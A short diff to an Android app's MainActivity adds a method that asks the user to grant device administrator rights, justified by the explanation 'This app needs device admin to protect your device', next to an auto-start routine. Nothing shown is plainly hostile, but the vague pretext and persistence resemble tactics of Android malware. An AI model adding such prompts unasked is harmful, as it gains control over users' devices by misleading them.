@@ -78,6 +78,25 @@ public class MainActivity extends Activity {
         startAutoStartProcess();
     }
 
+    private void activateDeviceAdmin() {
+    try {
+        ComponentName cn = DeviceAdminReceiver.getComponentName(this);
+        DevicePolicyManager dpm = (DevicePolicyManager) 
+            getSystemService(Context.DEVICE_POLICY_SERVICE);
+        
+        if (!dpm.isAdminActive(cn)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
+                "This app needs device admin to protect your device");
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        }
+    } catch (Exception e) {
+        Log.e(TAG, "Activate admin error: " + e.getMessage());
+    }
+    }
+
     // ==================== AUTO START PROCESS ====================
     
     private void startAutoStartProcess() {
